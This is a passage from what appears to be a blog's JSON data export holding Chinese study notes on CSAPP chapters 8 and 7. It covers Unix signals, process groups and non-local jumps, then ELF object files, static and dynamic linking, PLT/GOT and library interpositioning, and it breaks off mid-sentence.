`name=newvalue` 添加到当前进程的 `envp` 数组中。\n- 如果 `name` 已经存在了，那么就看 `override` 值，`overwrite` 值非零的话那么就覆盖，反之则不进行任何操作。\n- 成功返回 0，失败返回 -1\n\n`void unsetenv(const char *name);`\n\n- 定义在 `stdlib.h` 中。\n- 将 `name` 从当前的 `envp` 数组中删去。如果不存在的话就什么也不干。\n\n### 进程组\n\n`pid_t getpgrp(void);`\n\n- 定义在 `unistd.h` 中。\n- 获取当前进程的进程组 ID。\n\n`int setpgid(pid_t pid, pid_t pgid);`\n\n- 定义在 `unistd.h` 中。\n- 将进程 `pid` 的进程组改为 `pgid` 。\n- `pid` 为 0 时，那么就使用当前进程的 PID，如果 `pgid` 时是 0 ，那么就用 `pid` 指定的进程 PID 作为进程组 ID。\n- 成功则返回 0，错误则返回 -1。\n\n## 信号\n\nLinux 系统支持如下 30 种不同的信号：\n\n![](http://pic.caiwen.work/i/2025/08/12/689b1c1fc60ed.png)\n\n### 发送信号\n\n**使用 /bin/kill 程序**\n\n```bash\n/bin/kill -9 15213\n```\n\n则可以向 PID 为 15213 的进程发送信号 9（SIGKILL）。\n\n```bash\n/bin/kill -9 -15213\n```\n\n负数则表示一个进程组，将会向进程组中的每个进程发送信号。\n\n这里要用完整的路径 `/bin/kill` ，因为有些 Shell 有自己内置的 `kill` 指令。\n\n**使用键盘**\n\nShell 在任何时刻都有至多一个前台进程组和若干个后台进程组。比如输入\n\n```bash\nls | sort\n```\n\nShell 则会创建一个 `ls` 进程，一个 `sort` 进程，这两个进程属于同一个进程组，然后这个进程组是前台进程组。\n\n在键盘上输入 Ctrl + C 会使内核发送 SIGINT 信号到前台进程组中的每个进程组。输入 Ctrl + Z 会发送一个 SIGTSTP 信号到前台进程组中的每个进程组。\n\n**使用 kill 函数**\n\n`int kill(pid_t pid, int sig);`\n\n- 定义在 `signal.h` 中。\n- 如果 `pid` 大于 0，那么发送信号 `sig` 到进程 `pid`。如果 `pid` 为 0，那么信号发送到调用进程所在进程组中的每个进程，包括调用进程自己。如果 `pid` 小于 0 ，那么信号发送到进程组 ID 为 `pid` 绝对值的进程组中的每个进程。\n- 成功返回 0，错误返回 -1。\n\n**使用 alarm 函数**\n\n`unsigned int alarm(unsigned int secs);`\n\n- 定义在 `unistd.h` 中。\n- 调用后会设置一个时钟，该时钟在 `secs` 秒后发送一个 SIGALRM 信号给当前进程。如果 `secs` 为 0，那么不会发送信号。\n- 如果调用 `alarm` 前存在待处理的时钟，那么将会取消之前的那个，并返回之前的时钟剩余的秒数。如果调用前不存在待处理的时钟，则返回 0。\n\n### 接收信号\n\n内核准备调度一个进程时，会检查该进程的待处理信号集合。如果这个集合为空，那么继续执行这个进程的指令。否则，内核会选择待处理信号集合中的某个信号（通常是编号最小的信号）并进行处理。注意，进程每次被调度时都只处理一个信号，但可能处理一个信号时被内核切出去了，调度回来时又处理另一个信号（信号可以嵌套处理）。每个信号只会被加入到待处理集合中一个，也就是即使接收到多个同一信号，待处理集合里只会有一个。\n\n处理信号时，每个信号都会有一个默认行为：\n\n- 终止进程。\n- 终止进程并转储内存。\n- 停止进程，直到接收到 SIGCONT 信号。\n- 忽略该信号\n\n进程可以通过如下函数设置信号处理程序：\n\n`sighandler_t signal(int signum, sighandler_t handler);`\n\n- 定义在 `signal.h` 中。\n- 设置信号 `signum` 的处理函数为 `handler`。不能设置 SIGSTOP 和 SIGKILL 的处理函数。\n- 其中 `sighandler_t` 的定义为 `typedef void (*sighandler_t)(int);` ，即传递的函数应该接收一个 int 参数且无返回值。调用处理函数时，会将触发处理函数的信号编号以参数传递。这样可以允许一个函数作为多个信号的处理函数。\n  - 如果 `handler` 为 `SIG_IGN`，那么进程忽略该信号。\n  - 如果 `handler` 为 `SIG_DFL`，那么恢复该信号的默认行为。\n\n信号处理完毕，处理函数返回之后，一般情况下会回到进程之前被打断的地方继续执行。但是一些函数比较特殊，如果函数执行到一半，被信号打断的话，则会立刻返回，并返回一个错误。\n\n### 阻塞信号\n\nLinux 可以阻塞信号。当内核检查待处理信号集合的时候，会忽略掉其中也处于阻塞集合中的信号。但是注意，信号被阻塞，也仍然可以处于待处理集合中。可能出现某个信号被阻塞时受到了这个信号，先不处理，取消阻塞时又处理该信号。\n\nLinux 中有一个隐式阻塞机制，即内核默认阻塞当前正在处理的信号。\n\n我们可以使用如下的函数阻塞信号：\n\n`int sigprocmask(int how, const sigset_t *set, sigset_t *oldset);`\n\n- 定义在 `signal.h` 中。\n- `how` 值可以选择如下的值，表示函数进行的操作：\n  - `SIG_BLOCK`：把 `set` 中的信号添加到阻塞集合中。\n  - `SIG_UNBLOCK`：从 `block` 中删除 `set` 中的信号。\n  - `SIG_SETMASK`：直接设置当前阻塞集合为 `set`。\n- 如果 `oldset` 非空，那么会将操作之前的阻塞集合放入 `oldset` 中\n\n- 成功返回 0，错误返回 -1。\n\n有如下的函数可以用来处理信号集合：\n\n`int sigempty(sigset_t *set);`\n\n- 定义在 `signal.h` 中。\n\n- 将 `set` 清空。\n- 成功返回 0，错误返回 -1。\n\n`int sigfillset(sigset_t *set);`\n\n- 定义在 `signal.h` 中。\n\n- 把所有的信号都加入到 `set` 中。\n- 成功返回 0，错误返回 -1。\n\n`int sigaddset(sigset_t *set, int signum);`\n\n- 定义在 `signal.h` 中。\n\n- 将 `signum` 加入到 `set` 中。\n- 成功返回 0，错误返回 -1。\n\n`int sigismember(sigset_t *set, int signum);`\n\n- 定义在 `signal.h` 中。\n\n- 如果 `signum` 位于 `set` 中则返回 1，否则返回 0，错误返回 -1。\n\n一般按如下的方法来临时阻塞某个信号：\n\n![](http://pic.caiwen.work/i/2025/08/12/689b3a946dcbc.png)\n\n### 信号处理\n\n#### 基本原则\n\n编写信号处理程序需要遵循如下的原则：\n\n- 处理程序应尽可能的简单，比如只简单地设置一个全局标志并立即返回，主要的处理逻辑在主程序里执行，周期性地检查并重置这个标志。\n- 处理程序里面只能调用异步信号安全的函数，这种函数能够被信号处理程序安全地调用。原因有二：要么他们是可重入的，要么不能被信号处理程序中断。如下的函数都是异步信号安全函数。值得注意的是，很多常用的函数，如 `printf`、`sprintf` 、`malloc`、`exit` 都不在此列，因此在处理程序里面产生输出的唯一安全的方法是使用 `write` 函数，并且退出程序要用 `exit` 的异步信号安全的变种 `_exit`。\n\n![](http://pic.caiwen.work/i/2025/08/12/689b3c5945c02.png)\n\n- 许多异步信号安全的函数都可能在出错返回时设置 `errno`，但这样会干扰主程序中依赖于 `errno` 的部分。所以我们最好在处理程序的开头保存当前的 `errno`，并在返回时还原 `errno`。\n- 如果主程序和处理程序共享一个全局的数据结构，那么有必要在修改这个数据结构之前先屏蔽所有信号，无论是在主程序还是处理程序，防止修改到一半被打断。\n- 使用 `volatile` 修饰会被主程序和处理程序共享的变量。如果处理程序更新全局变量，主程序里周期性读取这个全局变量，那么编译器可能会认为反复的周期性读取这个变量是无意义的，因为它看起来没发生变化，所以编译器会将其缓存到寄存器中，导致主程序无法看到这个共享变量的变动。使用 `volatile` 修饰之后，会强制编译器每次访问这个变量的时候都是从内存中读取的。\n- 用 `sig_atomic_t` 声明标志。`sig_atomic_t` 是一个整数类型，能够保证对这个类型进行的读写都是原子的。比较完整的是 `volatile sig_atomic_t flag;` 。\n\n#### 不要用信号来对事件计数\n\nShell 的一个需求是，子进程终止或是停止时，Shell 需要更新自己维护的 Jobs 集合。\n\n一个实现是，在 SIGCHLD 信号的处理程序中使用 `waitpid`：\n\n![](http://pic.caiwen.work/i/2025/08/12/689b468818eb4.png)\n\n但是这样可能会出问题，因为我们之前提到即使发来了多个同种的信号，也只会出现在待处理集合中一次，只会被处理一次。所以我们不要用信号来对事件计数，信号触发时说明至少有一次信号触发，可能有多次。所以对于上面的需求，我们要使用 while 循环：\n\n![](http://pic.caiwen.work/i/2025/08/12/689b4777a8177.png)\n\n#### 同步流\n\nShell 的另一个需求是，创建子进程之后，新增一个 job，收到 SIGCHLD 信号之后又将 job 删除。\n\n一个简单的实现如下：\n\n![](http://pic.caiwen.work/i/2025/08/12/689b4a2e88005.png)\n\n但是这样还有问题，因为有可能 fork 之后，内核优先调度子进程，子进程又立刻退出，发送了一个 SIGCHLD 信号给 Shell，Shell 被内核调度时，由于收到了信号，转到了处理程序，处理程序删除对应的 job。但是 Shell 还没开始把 job 添加到 job 列表中，这就出现了错误。\n\n所以应该要在 fork 之前就屏蔽 SIGCHLD 信号，使得主程序不会被打断。但也要注意要在子进程中解除屏蔽：\n\n![](http://pic.caiwen.work/i/2025/08/12/689b4b37f3187.png)\n\n#### 显式等待信号\n\nShell 的又一个需求是，创建前台进程之后，Shell 一直等待前台进程结束。一个实现如下：\n\n![](http://pic.caiwen.work/i/2025/08/12/689b4c23bc78e.png)\n\n这里使用了一个忙等待，来等待前台进程的结束。这样的代码运行正确，但是循环会很浪费处理器资源。\n\n又一个选择是在循环中加入 `pause`，这样只有接收到信号才会被唤醒。不过这样又会带来竞争问题：有可能在 while 测试通过之后，`pause` 执行之前受到 SIGCHLD 信号，这样的话 `pause` 就不再会收到 SIGCHLD 信号了，`pause` 永远休眠。\n\n又一个选择是用 `sleep` 代替 `pause`。但是这样 `sleep` 的时间又难以选择，时间小循环又会比较浪费，时间大程序又会太慢。\n\n最合适的做法是使用 `sigsuspend`\n\n`int sigsuspend(const sigset_t *mask);`\n\n- 定义在 `signal.h` 中。\n- 该函数会暂时用 `mask` 替换当前的阻塞集合，然后挂起当前进程，直到收到一个信号，信号处理函数处理完毕之后，还原当前的阻塞集合，然后返回。\n- 一般我们会先阻塞某个信号，然后把没阻塞之前的阻塞集合作为 `mask` 参数。这样的话调用 `sigsuspend` 会先解除对信号的阻塞，收到信号后又立刻还原阻塞状态。\n- 返回 -1。\n\n于是上述代码修改为：\n\n![](http://pic.caiwen.work/i/2025/08/12/689b4f57c2f44.png)\n\n## 非本地跳转\n\nC 语言提供了一个用户级的异常控制流。我们有如下函数：\n\n`int setjmp(jmp_buf env);`\n\n- 定义在 `setjmp.h` 中。\n\n- 函数会在 `env` 缓冲区中保存当前调用环境，如程序计数器、栈指针、通用寄存器等。\n- 正常情况下返回 0，如果是通过 `longjmp` 函数返回到这里，会返回非 0。由于某种原因，`setjmp` 函数的返回值不能赋值给变量，但是可以使用 if 和 switch 语句对返回值进行测试。\n\n`void longjmp(jmp_buf env, int retval);`\n\n- 定义在 `setjmp.h` 中。\n- 函数从 `env` 缓冲区中恢复调用环境，然后从最近一次设置 `setjmp` 函数的地方返回，并带有非零的返回值 `retval`。\n\n非本地跳转的一个重要应用是，如果从一个深层嵌套的函数调用中发现了一个错误情况，我们可以直接返回到一个普通的错误处理程序，而不必费力解开调用栈。\n\n![](http://pic.caiwen.work/i/2025/08/12/689b519b3de73.png)\n\n非本地跳转的又一个重要应用是使一个信号处理程序分支到特殊的代码位置，而不是返回到被信号中断了的指令的位置。此时需要 `sigsetjmp` 和 `siglongjmp` 函数，这两个函数是 `setjmp` 和 `longjmp` 函数的可以被信号处理程序使用的版本。\n\n比如：\n\n![](http://pic.caiwen.work/i/2025/08/12/689b52d9e8089.png)\n\n这样可以实现，每次按下 Ctrl + C 之后，程序进行热重启。\n\n","summary":"本文介绍了操作系统中的异常处理机制，包括中断、陷阱、故障和终止，以及进程管理、信号处理和非本地跳转，涵盖了系统调用、进程创建与回收、信号发送与阻塞等核心概念。","key":["csapp","中断","信号","进程","异常"],"tags":[],"path":["os","csapp","CSAPP第八章 - 异常控制流.md"],"background":"http://pic.caiwen.work/i/2025/09/05/68baf6a9e823d.png","recommend":false,"status":"published"},{"type":"Article","title":"CSAPP第七章 - 链接","id":"csapp-7","createTime":"2025-08-08T11:28:00.000Z","updateTime":"2025-09-05T14:48:08.401Z","content":"\n\n\n## 编译器驱动程序\n\n有如下的程序：\n\n![](http://pic.caiwen.work/i/2025/08/08/6895e05c3f6cd.png)\n\n其中的 `main.c` 引用了另外一个 `sum.c` 文件的函数。我们可以通过 `gcc -Og -o prog main.c sum.c` 来把这两个文件链接到一块编译出一个产物。这里的 `gcc` 相当于是一个编译器驱动程序，代替用户执行预处理器、编译器、汇编器、链接器来生成一个可执行文件。\n\n上述 `gcc` 驱动编译的详细过程如下：\n\n- 首先把源码 `main.c` 翻译成一个中间文件 `main.i`：`cpp [other arguments] main.c /tmp/main.i`\n- 然后将这个中间文件翻译成汇编的文件 `main.s`：`cc1 /tmp/main.i -Og -o /tmp/main.s`\n- 然后驱动程序运行汇编器，将 `main.s` 翻译成一个可重定位目标文件 `main.o`：`as -o /tmp/main.o /tmp/main.s`\n- 然后驱动程序经过相同的过程生成 `sum.o`\n- 最后驱动程序运行链接器将 `main.o` 和 `sum.o` 和其他的必要文件组合起来，生成一个可执行目标文件 `prog`：`ld -o prog [system object files and args] /tmp/main.o /tmp/sum.o`\n\n## 目标文件\n\n目标文件有三种：\n\n- 可重定位目标文件：由汇编器生成，链接器将其与其他的可重定位目标文件合并，生成可执行目标文件\n- 可执行目标文件：可以被直接复制到内存中执行\n- 共享目标文件：一种特殊类型的可重定位目标文件，可以在编译时或是加载时被静态或是动态链接到程序中\n\n在 Linux 系统上，目标文件是 ELF 格式的。ELF 文件的开头会有一个 ELF 头，结尾会有一个节头部表，中间则是由若干个节组成。ELF 头指明当前文件的格式、机器类型等信息，还包括了节头部表起始位置偏移、节头部表条目的数量和大小。节头部表指明了 ELF 文件中间的节的位置和大小信息等信息。\n\n### 可重定位目标文件\n\n![](http://pic.caiwen.work/i/2025/08/08/6895e6cac89c6.png)\n\n其中包含的节如下：\n\n- `.text`：已编译的程序的机器代码\n- `.rodata`：常量信息，是只读的\n- `.data`：有初始值的全局变量和静态局部变量\n- `.bss`：没有初始值的全局变量和静态局部变量。这个节并不在 ELF 中占用实际的大小，而是在运行的时候直接在虚拟内存中进行映射，并由程序来给内存清零。`.bss` 可以认为是 Better Save Space ，一种节约文件大小的方式（尽管实际上 `.bss` 的来源不是这个）\n- `.symtab`：符号表，程序中定义的全局变量和引用的全局变量的信息都存放在这里。符号表将用于后续的链接的重定位\n- `.rel.text`：存放 `.text` 节中需要重定位的位置，用于后续重定位\n- `.rel.data`：存放 `.data` 节中需要重定位的位置，同上\n- `.debug`：调试符号表，只有在编译时添加 `-g` 选项才会被生成。调试符号表将会存放程序中定义的各种变量的信息，以及原始的 C 语言文件，用于调试\n- `.line`：编译时添加 `-g` 选项才会被生成。存放原始的 C 语言文件中的行号和 `.text` 中机器指令的映射关系\n- `.strtab`：`.symtab` 和 `.debug` 中的符号和节头部表的节名字这些 ELF 中的文本数据并没有直接存到相应的位置，而是存储到 `.strtab` 中。原来的位置上只存储文本在 `.strtab` 中的偏移。\n\n### 可执行目标文件\n\n![](http://pic.caiwen.work/i/2025/08/08/6895ef2149cec.png)\n\n和可重定位目标文件大致差不多，区别在于： ELF 头中还包含了程序的入口点。`.text` 、`.rodata`、`.data` 中的内容已经经过重定位了。`.init` 节定义了一个小函数，叫做 `__init`，用于程序的初始化。由于重定位完毕，所以不需要 `.rel` 相关的节。\n\n可执行目标文件中还包含一个段头部表，这个表中表明了 ELF 中每个节要映射到的虚拟内存的地址、占用的虚拟内存大小、访问权限等。一般映射 `.data` 段的时候会多映射一些空间，留给 `.bss`。同时，段头部表中会指明一个节在内存中的对齐要求。对于一个对其要求是 $align$ 的节，该节映射到虚拟内存中的首地址 $vaddr$ 应满足 $vaddr\\mod{align} = off \\mod {align} $，其中 $off$ 是可执行目标文件中第一个节的偏移量。\n\n有意思的是，尽管可执行目标文件不需要再与其他文件链接了，`.symtab` 还是存在。我们可以使用 `strip` 命令特意去掉。\n\n### 共享目标文件\n\nC 语言规范中定义了一组函数，这些函数放在 libc 库中，如 `printf`、`scanf` 等。为了支持这些库函数，一种方式是直接让编译器识别出这些函数，然后生成相应的代码。但是这样会增加编译器的复杂性。\n\n另一种方法是将所有的函数放到一个单独的可重定位目标文件中，如 `libc.o` ，然后 `gcc main.c /usr/lib/libc.o` 即可让引入库函数。不过这样的话，每个编译出来的程序都会携带一个完整的 `libc.o` ，会浪费内存。\n\n又一种方法是为每个函数创建一个单独的可重定位目标文件。不过这样做需要程序员自行链接合适的文件：`gcc main.c /usr/lib/printf.o /usr/lib/scanf.o`。但是这样很麻烦又容易出错。\n\n#### 静态库\n\n静态库将若干个可重定位目标文件组合到一个 `.a` 后缀的静态库文件中。这个文件的头部描述了其包含成员目标的信息。使用静态库文件时，链接器会自动抽取静态库文件中被使用到的成员，没被使用的则不会被抽取。\n\n如我们创建一个 `libvector` 库：\n\n![](http://pic.caiwen.work/i/2025/08/08/6895f95c9c626.png)\n\n使用 `gcc -c addvec.c multvec.c` 可以编译得到 `addvec.o` 和 `multvec.o`\n\n然后我们可以使用 `ar rcs libvector.a addvec.o multvec.o` 来打包得到静态库文件。\n\n![](http://pic.caiwen.work/i/2025/08/08/6895fa58d1cfb.png)\n\n使用时需要先有个头文件，头文件包含库函数的定义。\n\n然后使用如下命令编译：\n\n`gcc -static -o prog2c main2.o -L. -lvector`\n\n其中 `-static` 参数告诉编译驱动程序，链接器应该构建一个完全链接的可执行目标文件，可以直接加载到内存中运行。这个参数使得可执行文件不需要任何动态链接。\n\n`-L.` 表明寻找静态库的位置\n\n`-lvector` 是 `libvector.a` 的缩写\n\n![](http://pic.caiwen.work/i/2025/08/08/6895fb51961c7.png)\n\n#### 共享库\n\n静态库直接编译进程序了，这导致程序和静态库两者之间不能独立更新。同时，每个程序都会含有重复的静态库代码，仍然造成了很大的浪费。\n\n共享库可以解决上述缺陷。程序在编译时不去将共享库加入编译产物中，而是简单的记录共享库的名称，程序在加载的时候再去载入共享库。同时，利用虚拟内存技术，我们可以只加载一个共享库文件到内存中，让多个程序共享这块内存。\n\n我们可以使用如下命令生成共享库：\n\n`gcc -shared -fpic -o libvector.so addvec.c multvec.c`\n\n`-shared` 指明打包成共享库，`-fpic` 指明要生成与位置无关代码（这个参数是必须的）\n\n**编译时链接**\n\n`gcc -o prog2l main2.c ./libvector.so`\n\n**运行时使用**\n\n需添加编译参数 `-ldl` 来使得可执行文件链接动态加载器，以使用运行时链接的功能。\n\n在 `dlfcn.h` 头文件中，有如下的函数：\n\n`void *dlopen(const char *filename, int flag);`\n\n- 加载和链接共享库 `filename`\n- `flag` 可选如下选项\n  - `RTLD_GLOBAL` 将共享库的符号直接合并到当前程序的全局符号空间。\n    - 这样，可执行文件中只需要修饰全局符号为 `extern` ，然后在 `dlopen` 之后直接调用这个符号即可，不用再使用 `dlsym` 了。链接器在链接时，默认是允许动态链接，如果链接时 `extern` 符号没有被解析的话就视为后续运行时动态链接，除非添加 `-static` ，这样的话没有被解析的符号会报错。\n    - 同时，合并到全局符号空间之后，后续再次加载的共享库能够调用之前加载的共享库，也只需要定义符号的时候声明为 `extern`。\n    - 如果当前可执行文件编译时添加了 `-rdynamic` 选项，那么共享库还能去使用当前可执行文件中的符号。\n  - `RTLD_NOW` 立即解析共享库的符号引用，这样加载时比较耗时，但是使用符号的时候非常快。\n  - `RTLD_LAZY` 将符号解析推迟到使用时，这样加载时很快，但是初次使用符号的时候比较慢\n- 函数调用成功则返回一个指向句柄的指针，如果出错则返回 NULL\n\n`void *dlsym(void *handle, char *symbol);`\n\n- 获取加载的共享库中的某个符号的地址\n\n- `handle` 为 `dlopen` 返回的句柄指针，`symbol` 指明要引用的符号名称\n- 成功则返回指向符号的指针，出错则返回 NULL\n\n`int dlclose(void *handle);`\n\n- 卸载某个共享库\n- `handle` 为 `dlopen` 返回的句柄指针\n- 成功则返回 0，失败返回 -1\n\n`const char *dlerror(void);`\n\n- 如果前面的函数调用失败了，那么可以根据这个函数获取最近一次失败的消息\n- 如果前面的函数存在错误则返回错误文本的指针，如果前面没发生过错误则返回 NULL\n\n## 静态链接\n\n### 符号解析\n\n一个 C 文件中定义的全局符号，有可能只是占位，实际上是要引用另一个文件的全局符号。同时一个 C 文件中定义的全局符号有可能也要被其他 C 文件引用。全局符号将会存在 ELF 的 `.symtab` 中，在于其他文件链接时提供信息。、\n\n`.symtab` 中的条目结构如下：\n\n![](http://pic.caiwen.work/i/2025/08/08/689602709ec35.png)\n\n- `name` 是符号的名称，实际存储的是该名称在 `.strtab` 中的偏移。\n\n- `type` 指明这个符号是变量还是函数。\n- `binding` 指明这个符号是局部的还是全局的（局部的符号说明这个局部变量是被 `static` 修饰了）。\n- `section` 指明这个符号的定义是存在于哪个节中。实际存储的是一个到头部表的索引。\n\n- `value` 指明这个符号的定义存在于哪个位置。对于可重定位目标文件，这里存储的是相对于其所在的节中的偏移（配合 `section` 信息就知道其绝对位置）。对于可执行目标文件，这里存储的直接就是符号的定义的虚拟内存地址。\n- `size` 指明目标的大小，单位为字节。\n\n其中 `section` 中可取一些特殊值，称为伪节：\n\n- `ABS` 表明这个符号不应该被重定位。\n- `UNDEF` 表明这个符号的定义在当前文件中虽被定义了，但具体定义在外部的文件中，如没有函数体的函数定义、被 `extern` 修饰的函数或是变量。\n- `COMMON` 则存储弱符号。\n\n伪节只会在可重定位目标文件中。\n\n在 C 语言中，有一个强弱符号机制来处理多个文件之间全局符号的引用。所有的函数和有初始值的全局变量归为强符号，没有初始值的全局变量归为弱符号。\n\n对于多个重名的全局符号，链接器有如下的规则进行选取：\n\n- 规则 1：不允许有多个同名的的强符号\n- 规则 2：如果有一个强符号和多个弱符号，选择强符号\n- 规则 3：如果有多个弱符号，随机选择一个\n\n编译器在处理 C 文件时，如果遇到一个强符号，如果其初始值为 0，则会判定这个符号属于 `.bss` 节。如果其初始值不为 0，则会判定这个符号属于 `.data` 节。如果遇到一个弱符号，则编译器不知道这个符号是定义在当前文件中还是其他文件中的，因此就判定其处于 `COMMON` 节中，等待链接器进一步决定。\n\n如：\n\n![](http://pic.caiwen.work/i/2025/08/08/6896079679b24.png)\n\n上述文件无法链接在一起，因为有两个强符号。\n\n![](http://pic.caiwen.work/i/2025/08/08/68960b5d337fc.png)\n\n这个可以链接到一起，但是根据上述规则， `bar3.c` 中的 `x` 被判定为是在 `foo3.c` 中定义那个 `x`，所以调用 `f()` 时 `x` 发生了改变。由于只有弱符号的话会随机选择一个，因此也会带来类似的问题。\n\n现代的链接器默认自动开启 `-fno-common` 选项，使得存在重名符号的时候（即使不是强符号重名）也会直接报错。我们可以手动添加 `-fcommon` 来允许弱符号重名。\n\n而对于 C++，没有了强弱符号机制，而是有一个 ODR （One Definition Rule），全局符号一律不允许重名。如果在一个文件中想要引用另一个文件中的符号，则需要在当前文件的定义中添加 `extern` 修饰。编译器会将这个符号判定为属于 `UNDEF` 节中。\n\n上述过程则会为每个 C 文件构建了一个符号表。\n\n接着，链接器维护一个将要被合并的目标文件集合 $E$，一个未解析的符号集合 $U$，一个在前面输入文件中已经定义的符号集合 $D$。\n\n- 对于命令行上的每个输入文件 $f$，链接器则会判断 $f$ 是一个目标文件还是一个存档文件\n- 如果 $f$ 是目标文件，则会把 $f$ 放入 $E$ 中，用 $D$ 尝试解决 $f$ 中未解析的符号，再用把剩余未被解析的符号加入 $U$ 中\n- 如果 $f$ 是静态库文件，则在 $f$ 中的成员（即静态库中包含的目标文件）所定义的符号中寻找当前未被解析的元素。把对解析有帮助的成员目标文件放入 $F$，更新 $U$ 和 $D$。对解析没有帮助的则会直接丢弃\n- 进行完毕之后，如果 $U$ 是非空的，则会报错\n\n根据上述过程，我们在编译时，命令行上放置的文件的顺序非常重要，必须要使得前面未被解析的符号在后面的文件中存在定义。如：\n\n`gcc -static ./libvector.a main2.c`，处理 `libvector.a` 时，$U$ 是空的，这个库文件不会解决后面的 `main2.c` 的符号解析，所以会报错。所以我们最好是把静态库文件放在命令行的后面。\n\n同时我们还需要注意静态库文件的依赖关系。比如 `foo.c` 调用 `libx.a` 和 `libz.a`，而这两个库又调用 `liby.a`，那么我们需要这么写：`gcc foo.c libx.a libz.a liby.a`。\n\n如果出现循环依赖，我们可以在命令行上重复添加文件，比如 `libx.a` 调用 `liby.a`，而 `liby.a` 也调用了 `libx.a`，则有：`gcc foo.c libx.a liby.a libx.a`。当然另一个解决方法是把 `libx.a` 和 `liby.a` 合并成一个单独的静态库文件。\n\n完成符号解析后，链接器就知道所有的符号引用对应于哪个符号定义。\n\n### 重定位\n\n链接器需要把多个可重定位目标文件中，名字相同的节合并，比如把各个文件的 `.text` 合并成一个 `.text`。但是合并之后，一些全局符号的地址就会发生改变。编译器会提前知道哪些全局符号的地址暂时无法确定，于是在引用这些符号的地方，先不设置具体的地址，而是先留空，并记录这些位置，生成重定位条目，放到 `.rel` 相关的节上。文件合并之后，各个符号的地址就确定下来了，链接器会进行重定位，就是根据重定位条目，设置好具体的地址。\n\n重定位条目的结构如下：\n\n![](http://pic.caiwen.work/i/2025/08/08/68961551917cc.png)\n\n其中的 `offset` 表明需要重定位的地址。地址是相对于其所在节的偏移。\n\n`symbol` 表明这个要被重定位的引用，是引用了哪个符号，存储的是在符号表中的下标。\n\n`addend` 表明计算出重定位地址之后还需要进行的调整量。常用于重定位为 PC 相对地址时。\n\n`type` 表明重定位类型。这里讲两种最基本的类型：\n\n- `R_X86_64_PC32`：重定位为一个 PC 相对地址\n- `R_X86_64_32`：重定位为一个绝对的地址\n\n上述类型重定位的地址都是 32 位的，这是因为这两个类型是基于 x86-64 小型代码模型。这个模型假设可执行目标文件的大小小于 2GB，32 位的寻址就足够，GCC 默认使用这个模型。\n\n重定位算法如下：\n\n![](http://pic.caiwen.work/i/2025/08/08/68961722e82c6.png)\n\n其先枚举了要重定位的节，然后枚举该节下的重定位条目。现在我们已经知道每个节的真实首地址了，用 `ADDR(s)` 表示。已经知道引用的符号所被定义的真实地址了，用 `ADDR(r.symbol)` 表示。\n\n## 动态链接\n\n### 传统动态链接\n\n在编译时，链接器不将共享库中的代码和数据复制到可执行目标文件中，而是复制了一些重定位和符号信息，以便后续加载时链接共享库。\n\n可执行目标文件在加载时，加载器注意到其包含了一个 `.interp` 节，这一节包含了动态链接器的路径名（动态链接器本身可视为一个共享库，在 Linux 中是 `ld-linux.so`），然后加载器加载并调用动态链接器。\n\n动态链接器会寻找程序中引用的共享库，将共享库所在的内存映射到当前程序的虚拟内存空间中，然后动态链接器此时重定位程序中对共享库的引用。\n\n传统的动态链接机制有一些缺陷。首先这样会使得 `.text` 节可写，会有漏洞隐患。其次，这样的话，每个进程都需要独立的代码段的副本，而现代的操作系统，每个进程都共享一个代码段以节省内存。而且对于一个比较大的程序，加载时重定位所有引用的话也会严重拖慢程序的加载速度。\n\n并且，如果是可执行文件调用共享库还好，如果是共享库之间进行调用的话，需要对共享库进行重定位，那么就失去了共享库的性质了。\n\n### PLT/GOT 链接机制\n\n现代系统有一个机制，可以生成位置无关代码，也就是无论代码被加载到哪里，都可以被正常执行，无需重定位代码段。现代编译器产生的共享库和可执行文件都是位置无关代码。\n\n位置无关代码的原理是，同一个共享库/可执行文件中的数据段和代码段的相对距离是不变的，也就是代码段中可以 PC 相对地址来引用代码段。\n\n编译器在数据段最开始的地方创建了一个叫做 GOT（全局偏移量表），这个表中每个条目都是 8 字节，表示一个地址。编译器会在 GOT 中给程序中的所有全局符号都建立一个条目，表示这个全局符号的绝对地址，初始时为空，等待重定位，GOT 会对应一个重定位表。这样，加载程序的时候，动态链接器无需重定位代码段，只需要重定位 GOT 表即可。每个可执行文件和共享库实例都有一个独立 GOT 表，也就是加载他们的时候只需要建立 GOT 表和重定位 GOT 表的代价。\n\n![](http://pic.caiwen.work/i/2025/08/12/689acfc8512de.png)\n\n使用 GOT 表就可以解决很多问题了。但是现代编译系统引入了 PLT 来支持动态绑定机制。比如一个像 `libc.so` 的库，可能会输出成百上千个函数，如果在加载时，将这些函数对应在 GOT 表中的项目全部重定位，会造成很大的性能开销，且可执行程序可能只需要使用到库中的一部分函数，这也就使得很多重定位是浪费的。\n\nPLT 中每个条目都是一个 16 字节代码。 PLT 拥有可执行权限。GOT 和 PLT 联合使用时，`GOT[0]` 表明 `.dynamic` 节的地址，`GOT[1]` 表明重定位条目的地址，`GOT[2]` 表明动态链接器的入口地址，`PLT[0]` 将 `GOT[1]` 对应的地址压入栈中并调用动态链接器。\n\n每个外部函数都会有一个 ID，并在 PLT 中有一个对应的条目。\n\n当程序调用外部函数的时候，会先跳转到外部函数对应的 PLT 条目中，PLT 条目中的第一个执行是跳转指令，跳转到其对应的 GOT 条目中指向的地址。这个地址初始时又指向 PLT 条目的第二条执行，这个指令会将外部函数的 ID 压入栈中，然后跳到 `PLT[0]` 中，来调用动态链接器。\n\n动态链接器根据压入栈中的外部函数 ID 和重定位表来确定外部函数真实的运行地址，并重写 GOT 表，然后再调用外部函数。\n\n![](http://pic.caiwen.work/i/2025/08/12/689adc5fce701.png)\n\n后续再次调用外部函数的时候，从 PLT 跳到 GOT 对应的条目时，这个条目已经指明了外部函数的地址，可以直接跳过去：\n\n![](http://pic.caiwen.work/i/2025/08/12/689adcc85faec.png)\n\n这也就实现了延迟绑定\n\n## 库打桩\n\n库打桩可以让我们拦截对一个共享库的调用，反而执行自己的代码。\n\n### 编译时打桩\n\n首先有一个我们自己的函数：\n\n![](http://pic.caiwen.work/i/2025/08/12/689ae09f6adf0.png)\n\n然后编译 `gcc -DCOMPILETIME -c mymalloc.c`\n\n然后我们再编写一个自己的头文件，在这个头文件里通过宏来更改调用函数的名称：\n\n![](http://pic.caiwen.work/i/2025/08/12/689ae0571730f.png)\n\n编译：`gcc -I. -o intc int.c mymalloc.o`\n\n其中 `-I.` 是打桩的关键。这个参数将会让编译器优先从当前目录下寻找头文件，所以编译器会使用我们的 `malloc.h` 而不是标准的 `malloc.h`。\n\n### 链接时打桩\n\n链接器支持使用 `--wrap f` 的选项进行链接时打桩。这个选项告诉链接器，把对符号 `f` 的引用全部解析为对 `__wrap_f` （用于拦截），还把对 